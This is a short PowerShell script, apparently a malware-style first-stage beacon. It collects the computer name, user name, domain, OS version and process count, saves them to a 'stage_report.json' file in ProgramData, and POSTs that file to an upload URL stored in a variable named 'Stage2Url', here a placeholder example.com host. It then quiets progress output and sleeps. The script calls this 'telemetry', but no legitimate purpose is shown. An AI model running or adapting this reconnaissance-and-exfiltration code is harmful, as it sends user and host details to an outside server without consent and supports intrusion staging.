
$Stage2Url = "https://example.com/upload"
$ReportPath = "C:\ProgramData\stage_report.json"
$ErrorActionPreference = "Stop"

Write-Verbose "Collecting host telemetry"
$FetchResult = [ordered]@{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    Domain = $env:USERDOMAIN
    OSVersion = [Environment]::OSVersion.VersionString
    ProcessCount = (Get-Process).Count
}
$FetchResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
Write-Verbose ("Telemetry written to " + $ReportPath)
$Response = Invoke-RestMethod -Uri $Stage2Url -Method Post -Body (Get-Content -Path $ReportPath -Raw) -ContentType "application/json"
Write-Verbose ("Upload status: " + $Response)

$ProgressPreference = "SilentlyContinue"
Start-Sleep -Seconds 31
